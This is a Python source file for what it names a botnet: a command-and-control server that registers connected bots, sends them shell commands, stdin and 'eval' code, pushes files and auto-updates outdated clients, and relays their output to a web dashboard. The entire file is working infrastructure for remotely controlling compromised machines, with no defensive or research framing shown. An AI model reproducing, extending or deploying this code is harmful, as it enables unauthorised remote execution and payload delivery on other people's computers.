import importlib
from distutils.version import LooseVersion
import json
from threading import Thread, Condition
from threading import Lock
import select


try:
    from server import formatsock
except:
    import formatsock


MIN_CLIENT_VERSION = "0.2"

class BotNet(Thread):
    INPUT_TIMEOUT = 1

    def __init__(self, socketio):
        super().__init__()
        self.connlock = Lock()
        self.conncon = Condition(self.connlock)
        self.allConnections = {}
        self.socketio = socketio

    def addConnection(self, user, conn):
        with self.connlock:
            if user in self.allConnections:
                pass  # TODO: How to deal with duplicate usernames?
            self.allConnections[user] = conn
            self.conncon.notifyAll()
            # Notify recv thread

    def removeConnection(self, user):
        # Will be making changes to allConnections
        with self.connlock:
            if user in self.allConnections:
                # Wait for any sends to go through for this bot
                # terminate and remove
                try:
                    self.allConnections[user].close()
                except:
                    pass
                # Remove object, don't delete so sends still go through
                self.allConnections.pop(user)
                self.socketio.emit('disconnect', {'user': user}, namespace='/bot')
                print("[-] Lost connection to {}".format(user))

    def getConnections(self):
        with self.connlock:
            return self.allConnections.keys()

    def run(self):
        while True:
            with self.connlock:
                bots = list(self.allConnections.values())
                while len(bots) == 0:
                    self.conncon.wait()
                    bots = list(self.allConnections.values())
            # Waiting for bot input, rescan for new bots every INPUT_TIMEOUT
            # TODO maybe use pipe as interrupt instead of timeout?
            rs, _, _ = select.select(bots, [], [], BotNet.INPUT_TIMEOUT)
            # We now have a tuple of all bots that have sent data to the botnet
            for bot in rs:
                user = bot.user
                try:
                    msg = bot.recv()
                    jsonobj = json.loads(msg.decode('UTF-8'))
                    jsonobj['user'] = user
                    jsonobj['stdout'] = jsonobj['stdout'].rstrip()
                    self.socketio.emit('response', jsonobj, namespace="/bot")
                except IOError:
                    # Connection was interrupted
                    self.removeConnection(user)

    def sendStdin(self, user, cmd):
        with self.connlock:
            if user in self.allConnections:
                self.allConnections[user].send(cmd, type="stdin")
                return True
            self.socketio.emit('response',
                               {'stdout': '', 'stderr': 'Client {} no longer connected.'.format(user), 'user': user})
            return False

    def sendCmd(self, user, cmd):
        with self.connlock:
            if user in self.allConnections:
                self.allConnections[user].send(cmd, type="cmd")
                return True
            self.socketio.emit('response',
                               {'stdout': '', 'stderr': 'Client {} no longer connected.'.format(user), 'user': user})
            return False

    def sendEval(self, user, cmd):
        with self.connlock:
            if user in self.allConnections:
                self.allConnections[user].send(cmd, type="eval")
                return True
            self.socketio.emit('response',
                               {'stdout': '', 'stderr': 'Client {} no longer connected.'.format(user), 'user': user})
            return False

    def sendFile(self, user, filename, fileobj):
        with self.connlock:
            if user in self.allConnections:
                self.allConnections[user].sendFile(filename, fileobj)
                return True
            self.socketio.emit('response',
                               {'stdout': '', 'stderr': 'Client {} no longer connected.'.format(user), 'user': user})
            return False


class BotServer(Thread):
    def __init__(self, tcpsock, botnet, socketio, clientfile):
        Thread.__init__(self)
        self.tcpsock = tcpsock
        self.botnet = botnet
        self.socketio = socketio
        self.clientfile = clientfile
        self.clientversion = LooseVersion(MIN_CLIENT_VERSION)

    def run(self):
        while True:
            self.tcpsock.listen(5)
            (clientsock, (ip, port)) = self.tcpsock.accept()
            clientformatsock = formatsock.FormatSocket(clientsock)
            msgbytes = clientformatsock.recv()
            host_info = json.loads(msgbytes.decode('UTF-8'))

            user = host_info['user'].strip()
            botversion = LooseVersion(host_info['version'])
            bot = Bot(clientsock, host_info, self.socketio)
            if botversion < self.clientversion:
                # Autoupdate
                print("[*] Updating {} on version {}".format(user,botversion))
                bot.sendClientFile(open(self.clientfile,'rb'))
            else:
                print("[+] Received connection from {}".format(user))
                self.botnet.addConnection(user, bot)
                self.socketio.emit('connection', {'user': user}, namespace='/bot')

class Bot:
    FILE_SHARD_SIZE = 4096
    FILE_STREAM = 'fstream'
    FILE_CLOSE = 'fclose'
    FILE_FILENAME = 'fname'
    CLIENT_STREAM = 'cstream'
    CLIENT_CLOSE = 'cclose'

    def __init__(self, sock, host_info, socketio):
        self.sock = formatsock.FormatSocket(sock)
        self.arch = host_info['arch'][:-1]
        self.user = host_info['user'][:-1]
        self.botlock = Lock()
        self.socketio = socketio

    def send(self, cmd, type="stdin"):
        json_str = json.dumps({type: cmd})
        with self.botlock:
            self.sock.send(json_str)

    def recv(self):
        return self.sock.recv()

    def close(self):
        with self.botlock:
            self.sock.close()

    def fileno(self):
        '''
        Returns the OS fileno of the underlying socket, that way the
        OS can wait for IO on the fileno and allow us to serve many bots
        simultaneously
        '''
        return self.sock.fileno()

    def sendFile(self, filename, fileobj):
        # TODO: single worker thread instead of new one?
        t = Thread(target=self.__sendFileHelper(fileobj, filename))
        t.start()

    def sendClientFile(self, fileobj):
        self.sendFile(None,fileobj)

    def __sendFileHelper(self, fileobj, filename=None):
        with self.botlock:
            dat = fileobj.read(Bot.FILE_SHARD_SIZE)
            if len(dat) > 0:
                while len(dat) > 0:
                    bytestr = dat.decode('UTF-8')
                    if filename:
                        # Particular file
                        json_str = json.dumps({Bot.FILE_STREAM:bytestr,Bot.FILE_FILENAME:filename})
                    else:
                        # Client file
                        json_str = json.dumps({Bot.CLIENT_STREAM: bytestr})
                    self.sock.send(json_str)
                    dat = fileobj.read(Bot.FILE_SHARD_SIZE)
                if filename:
                    json_str = json.dumps({Bot.FILE_CLOSE: filename})
                else:
                    json_str = json.dumps({Bot.CLIENT_CLOSE: True})
                self.sock.send(json_str)
                fileobj.close()
                # TODO emit file upload success